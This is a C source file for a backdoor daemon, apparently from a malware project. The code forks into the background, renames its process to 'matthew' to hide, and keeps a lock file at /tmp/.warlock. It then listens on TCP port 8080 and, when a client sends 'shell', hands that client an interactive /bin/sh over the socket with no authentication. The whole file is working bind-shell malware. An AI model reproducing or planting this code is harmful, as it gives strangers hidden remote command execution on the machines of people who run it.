#include <sys/file.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/prctl.h>
#include <sys/wait.h>

#include "daemon.h"
#include "utils.h"
#include "syscall.h"

#define CLOSE_END 0
#define NO_CLOSE_END 1
#define MAX_CLIENTS 1

static int my_htons(int port)
{
	return ((port & 0xff) << 8) | ((port & 0xff00) >> 8);
}

#ifdef LOGGER
static void logger(const char *msg)
{
	int fd = open(STR("/tmp/.daemon"), O_WRONLY | O_CREAT | O_APPEND, 0644);
	if (fd == -1) {
		return;
	}

	write(fd, msg, ft_strlen(msg));
	close(fd);
}
#else
static void logger(const char *msg)
{
	(void)msg;
}
#endif

static int create_server(void)
{
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd == -1) {
		return -1;
	}

	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_port = my_htons(8080),
		.sin_addr.s_addr = INADDR_ANY
	};

	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0) {
		close(fd);
		return -1;
	}

	if (bind(fd, &addr, sizeof(addr)) < 0) {
		close(fd);
		return -1;
	}

	if (listen(fd, 0) < 0) {
		close(fd);
		return -1;
	}

	//if (fcntl(fd, F_SETFL, O_NONBLOCK) == -1) {
	//	close(fd);
	//	return -1;
	//}

	return fd;
}

static int accept_client(int fd)
{
	struct sockaddr_in addr;
	socklen_t addr_len = sizeof(addr);

	int client_fd = accept(fd, &addr, &addr_len);
	if (client_fd == -1) {
		return -1;
	}

	return client_fd;
}

ret_t hello(param_t *command)
{
	(void)command;
	logger(STR("hello\n"));
	return 0;
}

ret_t exec_shell(param_t *command)
{
	char *argv[] = {STR("/bin/sh"), STR("-i"), STR("+m"), NULL};
	pid_t pid = fork();
	int client_fd = command->client_fd;

	if (pid == 0) {
		//setuid(0); // change to root
		dup2(client_fd, 0);
		dup2(client_fd, 1);
		dup2(client_fd, 2);
		execve(argv[0], argv, command->envp);
		exit(0);
	} 
	else {
		siginfo_t info;
		waitid(P_PID, pid, &info, WEXITED);
		return (info.si_status == 0) ? 0 : 1;

	}
	return 0;
}

ret_t unknown(param_t *command)
{
	(void)command;
	logger(STR("unknown command\n"));
	return 0;
}

command_func_t get_command(const char *cmd)
{

	command_t commands[] = {
		{STR("hello"), hello},
		{STR("shell"), exec_shell},
		{NULL, unknown}
	};

	for (int i = 0; commands[i].name != NULL; i++) {
		if (ft_strcmp(commands[i].name, cmd) == 0) {
			return commands[i].func;
		}
	}

	return unknown;
}

static void poller(int fd, char **envp)
{

	int use_client = 0;
	int client_fd = -1;
	char buf[256];
	int ret = 0;

	while (1) {

		if (use_client < MAX_CLIENTS) {
			client_fd = accept_client(fd);
			if (client_fd == -1) {
				logger(STR("accept failed\n"));
				break;
			}
			use_client++;
		}

		buf[0] = '\0';
		ret = read(client_fd, buf, sizeof(buf));
		if (ret == -1) {
			close(client_fd);
			break;
		}
		else if (ret == 0) {
			logger(STR("client disconnected\n"));
			use_client--;
			close(client_fd);
			continue;
		}

		buf[ret] = '\0';
		if (buf[ret - 1] == '\n') {
			buf[ret - 1] = '\0';
		}

		param_t command = {
			.client_fd = client_fd,
			.envp = envp
		};

		command_func_t func = get_command(buf);
		if (func != NULL) {
			func(&command);
		}

	}
}

//static void poller(int fd, char **envp)
//{
//	struct pollfd fds[MAX_CLIENTS + 1];
//	fds[0].fd = fd;
//	fds[0].events = POLLIN;
//
//	for (int i = 1; i < MAX_CLIENTS + 1; i++) {
//		fds[i].fd = -1;
//	}
//
//	int use_client = 0;
//
//	while (1) {
//		if (poll(&fds, use_client + 1, -1) == -1) {
//			break;
//		}
//
//		if (fds[0].revents & POLLIN) {
//			if (use_client == MAX_CLIENTS) {
//				logger(STR("max clients\n"));
//				continue;
//			}
//
//			int client_fd = accept_client(fd);
//
//			if (client_fd != -1) {
//				for (int i = 1; i < MAX_CLIENTS + 1; i++) {
//					if (fds[i].fd == -1) {
//						fds[i].fd = client_fd;
//						fds[i].events = POLLIN;
//						use_client++;
//						logger(STR("new client\n"));
//						break;
//					}
//				}
//			}
//		}
//
//		for (int i = 1; i < MAX_CLIENTS + 1; i++) {
//			if (fds[i].fd == -1 || (fds[i].revents & POLLIN) == 0) 
//				continue;
//			else {
//				char buf[1024];
//				int ret = read(fds[i].fd, buf, sizeof(buf));
//				if (ret <= 0) {
//					close(fds[i].fd);
//					fds[i].fd = -1;
//					use_client--;
//					logger(STR("client disconnected\n"));
//				}
//				else {
//					buf[ret] = '\0';
//					if (buf[ret - 1] == '\n') {
//						buf[ret - 1] = '\0';
//					}
//					param_t command = {
//						.client_fd = fds[i].fd,
//						.envp = envp
//					};
//					command_func_t func = get_command(buf);
//					if (func != NULL) {
//						func(&command);
//					}
//				}
//			}
//		}
//	}
//}

static int lock(int *lock_fd, int close_end)
{
	*lock_fd = open(STR("/tmp/.warlock"), O_CREAT | O_RDWR, 0644);

	if (*lock_fd == -1) {
		return 1;
	}

	if (flock(*lock_fd, LOCK_EX | LOCK_NB) < 0) {
		logger(STR("already locked\n"));
		close(*lock_fd);
		return 1;
	} else {
		if (close_end == NO_CLOSE_END) {
			logger(STR("locked\n"));
		}
	}

	if (close_end == CLOSE_END) {
		//flock(*lock_fd, LOCK_UN);
		close(*lock_fd);
	}
	return 0;
}

static int unlock(int *lock_fd)
{
	//lock_fd = open(STR("/tmp/.warlock"), O_RDONLY);

	if (*lock_fd == -1) {
		return 1;
	}
	else if (flock(*lock_fd, LOCK_UN) < 0) {

		logger(STR("unlock failed\n"));
		close(*lock_fd);
		return 1;
	} else {
		logger(STR("unlocked\n"));
	}

	close(*lock_fd);
	return 0;
}

void run(int *lock_fd, char **envp)
{
	//signal_init();

	int server_fd = create_server();
	if (server_fd == -1) {
		return;
	}

	poller(server_fd, envp);

	close(server_fd);

	unlock(lock_fd);
}

static void close_fds(void)
{
	for (int fd = 0; fd < 1024; fd++) {
		close(fd);
	}
}

static int attach_to_devnull(void)
{
	int fd = open(STR("/dev/null"), O_RDONLY);
	if (fd == -1) {
		return -1;
	}

	if (dup2(fd, STDIN_FILENO) < 0) {
		return -1;
	}

	close(fd);

	fd = open(STR("/dev/null"), O_WRONLY);
	if (fd == -1) {
		return -1;
	}

	if (dup2(fd, STDOUT_FILENO) < 0) {
		return -1;
	}
	if (dup2(fd, STDERR_FILENO) < 0) {
		return -1;
	}

	close(fd);
	return 0;
}

int	daemonize(char **envp)
{
	/* check if already locked, 
	 * if not locked: doesnt lock but instead continues 
	 * else returns 0 */

	int lock_fd = -1;
	if (lock(&lock_fd, CLOSE_END) == 1) {
		return 0;
	}

	pid_t	pid;

	pid = fork();

	if (pid < 0)
		return -1;
	if (pid > 0)
		return 0;

	if (setsid() == -1) {
		logger(STR("setsid failed\n"));
		return -1;
	}


	//if (setpgid(0, 0) == -1) {
	//	logger(STR("setpgid failed\n"));
	//	return -1;
	//}

	pid = fork();
	if (pid < 0)
		return -1;
	if (pid > 0)
		exit(0);

	char name[16] = "matthew";
	prctl(PR_SET_NAME, name);
	
	close_fds();
	//close(0);
	//close(1);
	//close(2);

	if (attach_to_devnull() == -1) {
		return -1;
	}

	//setpgid(0, 0);
	chdir(STR("/"));
	umask(0);


	/* lock the file (.warlock) at this point */
	if (lock(&lock_fd, NO_CLOSE_END) == 1) {
		write(1, STR("already locked\n"), 15);
		return 0;
	}

	run(&lock_fd, envp);
	return 0;
}
